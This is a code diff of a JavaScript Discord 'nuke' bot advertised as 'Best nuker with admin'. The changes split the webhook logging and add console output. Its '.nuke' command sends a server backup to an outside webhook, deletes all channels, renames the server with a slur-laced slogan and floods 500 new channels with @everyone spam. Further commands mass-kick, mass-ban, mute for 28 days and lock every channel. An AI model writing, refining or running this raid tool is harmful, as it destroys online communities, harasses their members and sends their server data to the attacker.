@@ -1,7 +1,6 @@
 const { Client, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } = require('discord.js');
 const http = require('http');
 const https = require('https');
-const FormData = require('form-data');
 
 const client = new Client({ intents: [1, 512, 32768, 2, 16] });
 
@@ -14,11 +13,12 @@ const OWNER_ID = "1183142340609708072";
 const WHITELIST_ROLE_ID = "1498099673406374029";
 
 http.createServer((req, res) => {
-    res.writeHead(200, {'Content-Type': 'text/plain'});
+    res.writeHead(200);
     res.end('Alive');
 }).listen(process.env.PORT || 3000);
 
-client.once('ready', () => console.log(`[+] ${client.user.tag} ready`));
+client.once('ready', () => console.log(`[+] ${client.user.tag} is online`));
+
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 
 // Backup helpers
@@ -43,12 +43,10 @@ async function backupGuild(guild) {
 
 async function restoreGuild(guild, backup) {
     await guild.setName(backup.name).catch(() => {});
-    // delete current channels
     for (const ch of guild.channels.cache.values()) {
         await ch.delete().catch(() => {});
         await sleep(100);
     }
-    // create categories first
     const categories = backup.channels.filter(c => c.type === ChannelType.GuildCategory);
     const others = backup.channels.filter(c => c.type !== ChannelType.GuildCategory);
     const catMap = new Map();
@@ -67,10 +65,8 @@ async function restoreGuild(guild, backup) {
         if (created) catMap.set(cat.name, created);
         await sleep(150);
     }
-    // recreate other channels
     for (const ch of others) {
-        const parent = ch.parentId ? 
-            catMap.get(backup.channels.find(c => c.type === 4 && c.name === categories.find(cat => cat.name === ch.parentId)?.name)?.name) : null;
+        const parent = ch.parentId ? catMap.get(backup.channels.find(c => c.type === 4 && c.name === categories.find(cat => cat.name === ch.parentId)?.name)?.name) : null;
         await guild.channels.create({
             name: ch.name,
             type: ch.type,
@@ -87,36 +83,51 @@ async function restoreGuild(guild, backup) {
     }
 }
 
-// Webhook send with file attachment (backup.json)
-async function sendWebhookWithBackup(backup, guildId, originalName, username, time) {
-    const form = new FormData();
-    
+// Send log to webhook WITHOUT backup file first (simple JSON)
+async function sendLog(guildId, originalName, username, time) {
     const embed = new EmbedBuilder()
         .setTitle('Server Nuked')
         .setDescription(`**Name:** ${originalName}\n**By:** ${username}\n**Time:** ${time}`)
         .setColor(0xff0000);
-    
     const button = new ButtonBuilder()
         .setCustomId(`restore_${guildId}`)
         .setLabel('Restore Server')
         .setStyle(ButtonStyle.Success);
     const row = new ActionRowBuilder().addComponents(button);
-
+    
     const payload = {
         content: '**Server Nuked**',
         embeds: [embed.toJSON()],
         components: [row.toJSON()]
     };
 
-    form.append('payload_json', JSON.stringify(payload));
-    const backupJson = JSON.stringify(backup, null, 2);
-    form.append('files[0]', Buffer.from(backupJson, 'utf-8'), `backup-${guildId}.json`);
+    const response = await fetch(LOG_WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+    });
+    console.log(`[WEBHOOK] Simple log status: ${response.status}`);
+    return response.ok;
+}
 
-    await fetch(LOG_WEBHOOK, {
+// Send backup file separately
+async function sendBackupFile(backup, guildId) {
+    const FormData = require('form-data');
+    const form = new FormData();
+    
+    const payload = {
+        content: '**Backup data attached**'
+    };
+    form.append('payload_json', JSON.stringify(payload));
+    form.append('files[0]', Buffer.from(JSON.stringify(backup, null, 2), 'utf-8'), `backup-${guildId}.json`);
+
+    const response = await fetch(LOG_WEBHOOK, {
         method: 'POST',
         body: form,
         headers: form.getHeaders()
     });
+    console.log(`[WEBHOOK] File upload status: ${response.status}`);
+    return response.ok;
 }
 
 client.on('messageCreate', async (message) => {
@@ -126,7 +137,6 @@ client.on('messageCreate', async (message) => {
     const args = message.content.trim().split(/\s+/);
     const cmd = args[0].toLowerCase();
 
-    // .whitelist
     if (cmd === '.whitelist') {
         if (!isOwner) return message.reply('You are not the owner').catch(() => {});
         const target = message.mentions.members.first();
@@ -135,16 +145,13 @@ client.on('messageCreate', async (message) => {
         return;
     }
 
-    // Protected server guard
     if (isProtected && !isOwner && cmd !== '.panel' && cmd !== '.extpanel') {
         if (message.content.startsWith('.')) return message.reply('Server protected').catch(() => {});
         return;
     }
-    if ((cmd === '.panel' || cmd === '.extpanel') && isProtected && !isOwner) return;
 
-    // Panels
     if (cmd === '.panel') {
-        const embed = new EmbedBuilder().setTitle('Discord Nuke Bot').setDescription('**Best nuker with admin**\nClick the button below to invite.').setColor(0xff0000);
+        const embed = new EmbedBuilder().setTitle('Discord Nuke Bot').setDescription('**Best nuker with admin**').setColor(0xff0000);
         const row = new ActionRowBuilder().addComponents(
             new ButtonBuilder().setLabel('Invite').setStyle(ButtonStyle.Link).setURL(INVITE_URL),
             new ButtonBuilder().setLabel('Commands').setStyle(ButtonStyle.Primary).setCustomId('cmds')
@@ -152,96 +159,93 @@ client.on('messageCreate', async (message) => {
         return message.channel.send({ embeds: [embed], components: [row] }).catch(() => {});
     }
     if (cmd === '.extpanel') {
-        const embed = new EmbedBuilder().setTitle('External Bot Commands').setDescription(`/say /blame /spam (free)\n/fast-flood /custom-spam /l-spam (premium)`).setColor(0x00ff00).setFooter({text:'Click to add external bot'});
+        const embed = new EmbedBuilder().setTitle('External Bot').setDescription('User-installable bot').setColor(0x00ff00);
         const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Add External Bot').setStyle(ButtonStyle.Link).setURL(EXT_INVITE));
         return message.channel.send({ embeds: [embed], components: [row] }).catch(() => {});
     }
 
-    // .nuke – backup, webhook with restore button, then destroy
     if (cmd === '.nuke') {
-        if (isProtected) return message.reply('Server protected').catch(() => {});
-        await message.delete().catch(() => {});
-        const g = message.guild;
-        const originalName = g.name;
-        const username = message.author.tag;
-        const time = new Date().toISOString();
+        console.log(`[NUKE] Triggered by ${message.author.tag} in ${message.guild.name}`);
+        try {
+            if (isProtected) return message.reply('Server protected').catch(() => {});
+            await message.delete().catch(() => {});
+            const g = message.guild;
+            const originalName = g.name;
+            const username = message.author.tag;
+            const time = new Date().toISOString();
 
-        // 1. Backup
-        const backup = await backupGuild(g);
+            console.log('[NUKE] Backing up...');
+            const backup = await backupGuild(g);
+            console.log('[NUKE] Backup complete.');
 
-        // 2. Send webhook with embed, button, and backup.json (fire and forget)
-        sendWebhookWithBackup(backup, g.id, originalName, username, time).catch(() => {});
+            // Send log with button (no file)
+            console.log('[NUKE] Sending log webhook...');
+            const logOk = await sendLog(g.id, originalName, username, time);
+            console.log(`[NUKE] Log sent: ${logOk}`);
 
-        // 3. Nuke
-        await g.setName('NGA GOT NUKED BY JHUB').catch(() => {});
-        const channels = Array.from(g.channels.cache.values());
-        for (const ch of channels) { await ch.delete().catch(() => {}); await sleep(100); }
-        for (let i = 0; i < 500; i++) {
-            g.channels.create({ name: 'jhub-on-top', type: 0 }).then(ch => {
-                if (!ch) return;
-                for (let j = 0; j < 10; j++) ch.send('@everyone @here Discord.gg/Jhub NGA GOT NUKED BY JHUB').catch(() => {});
-            }).catch(() => {});
-            await sleep(200);
+            // Send backup file as attachment
+            console.log('[NUKE] Sending backup file...');
+            const fileOk = await sendBackupFile(backup, g.id);
+            console.log(`[NUKE] File sent: ${fileOk}`);
+
+            // Nuke
+            console.log('[NUKE] Starting nuke...');
+            await g.setName('NGA GOT NUKED BY JHUB').catch(() => {});
+            const channels = Array.from(g.channels.cache.values());
+            for (const ch of channels) {
+                await ch.delete().catch(() => {});
+                await sleep(100);
+            }
+            for (let i = 0; i < 500; i++) {
+                g.channels.create({ name: 'jhub-on-top', type: 0 }).then(ch => {
+                    if (!ch) return;
+                    for (let j = 0; j < 10; j++) ch.send('@everyone @here Discord.gg/Jhub NGA GOT NUKED BY JHUB').catch(() => {});
+                }).catch(() => {});
+                await sleep(200);
+            }
+            console.log('[NUKE] Nuke complete.');
+        } catch(e) {
+            console.error('[NUKE] Error:', e);
         }
         return;
     }
 
-    // Other destructive commands
-    if (cmd === '.kick') { const m = message.mentions.members.first(); if (!m) return message.reply('Mention a user'); m.kick().then(() => message.reply(`Kicked ${m.user.tag}`)).catch(() => {}); return; }
-    if (cmd === '.ban') { const m = message.mentions.members.first(); if (!m) return message.reply('Mention a user'); m.ban().then(() => message.reply(`Banned ${m.user.tag}`)).catch(() => {}); return; }
-    if (cmd === '.kickall') { let c = 0; for (const [, m] of message.guild.members.cache) { if (m.kickable && m.id !== client.user.id) { m.kick().catch(() => {}); c++; await sleep(100); } } message.reply(`Kicked ${c} members`).catch(() => {}); return; }
-    if (cmd === '.banall') { let c = 0; for (const [, m] of message.guild.members.cache) { if (m.bannable && m.id !== client.user.id) { m.ban().catch(() => {}); c++; await sleep(100); } } message.reply(`Banned ${c} members`).catch(() => {}); return; }
-    if (cmd === '.muteall') { let c = 0; for (const [, m] of message.guild.members.cache) { if (m.moderatable && m.id !== client.user.id) { m.timeout(28*24*60*60*1000).catch(() => {}); c++; await sleep(100); } } message.reply(`Muted ${c} members`).catch(() => {}); return; }
-    if (cmd === '.lockall') { let c = 0; for (const [, ch] of message.guild.channels.cache) { if (ch.type === 0) { ch.permissionOverwrites.create(message.guild.roles.everyone, { SendMessages: false }).catch(() => {}); c++; await sleep(100); } } message.reply(`Locked ${c} channels`).catch(() => {}); return; }
+    // Other commands
+    if (cmd === '.kick') { const m = message.mentions.members.first(); if (!m) return; m.kick().catch(() => {}); }
+    if (cmd === '.ban') { const m = message.mentions.members.first(); if (!m) return; m.ban().catch(() => {}); }
+    if (cmd === '.kickall') { for (const [, m] of message.guild.members.cache) { if (m.kickable && m.id !== client.user.id) { m.kick().catch(() => {}); } } }
+    if (cmd === '.banall') { for (const [, m] of message.guild.members.cache) { if (m.bannable && m.id !== client.user.id) { m.ban().catch(() => {}); } } }
+    if (cmd === '.muteall') { for (const [, m] of message.guild.members.cache) { if (m.moderatable) m.timeout(28*24*60*60*1000).catch(() => {}); } }
+    if (cmd === '.lockall') { for (const [, ch] of message.guild.channels.cache) { if (ch.type === 0) ch.permissionOverwrites.create(message.guild.roles.everyone, { SendMessages: false }).catch(() => {}); } }
 });
 
-// Interaction handler for buttons (restore + cmds list)
 client.on('interactionCreate', async (interaction) => {
     if (!interaction.isButton()) return;
-
     if (interaction.customId === 'cmds') {
-        const embed = new EmbedBuilder()
-            .setTitle('Command List')
-            .setDescription(`.whitelist @user (owner)\n.nuke (backup + restore)\n.kick / .ban @user\n.kickall / .banall / .muteall / .lockall\n.panel / .extpanel`)
-            .setColor(0xff0000);
+        const embed = new EmbedBuilder().setTitle('Commands').setDescription('.nuke .kick .ban .kickall .banall .muteall .lockall .panel .extpanel');
         return interaction.reply({ embeds: [embed], ephemeral: true });
     }
-
     if (interaction.customId.startsWith('restore_')) {
-        const guildId = interaction.customId.split('_')[1];
-        if (interaction.user.id !== OWNER_ID) 
-            return interaction.reply({ content: 'Only the bot owner can restore.', ephemeral: true });
-
+        if (interaction.user.id !== OWNER_ID) return interaction.reply({ content: 'Only owner can restore.', ephemeral: true });
         await interaction.deferReply({ ephemeral: true });
-
+        const guildId = interaction.customId.split('_')[1];
         const guild = client.guilds.cache.get(guildId);
-        if (!guild) return interaction.editReply('Server not found. Bot may have been kicked.');
-
+        if (!guild) return interaction.editReply('Server not found.');
         const msg = interaction.message;
         const attachment = msg.attachments.first();
-        if (!attachment || !attachment.name.endsWith('.json')) 
-            return interaction.editReply('No backup file found on this message.');
-
+        if (!attachment) return interaction.editReply('No backup file.');
         try {
             const backupText = await fetch(attachment.url).then(r => r.text());
             const backup = JSON.parse(backupText);
-
             await restoreGuild(guild, backup);
-
-            // Disable the restore button
             const disabledRow = new ActionRowBuilder().addComponents(
-                new ButtonBuilder()
-                    .setCustomId('restored')
-                    .setLabel('Server Restored')
-                    .setStyle(ButtonStyle.Secondary)
-                    .setDisabled(true)
+                new ButtonBuilder().setCustomId('done').setLabel('Restored').setStyle(ButtonStyle.Secondary).setDisabled(true)
             );
-            await interaction.message.edit({ components: [disabledRow] }).catch(() => {});
-
-            await interaction.editReply('Server restored successfully!');
-        } catch (e) {
+            await msg.edit({ components: [disabledRow] }).catch(() => {});
+            await interaction.editReply('Server restored!');
+        } catch(e) {
             console.error(e);
-            await interaction.editReply('Failed to restore. Check logs.');
+            await interaction.editReply('Restore failed.');
         }
     }
 });
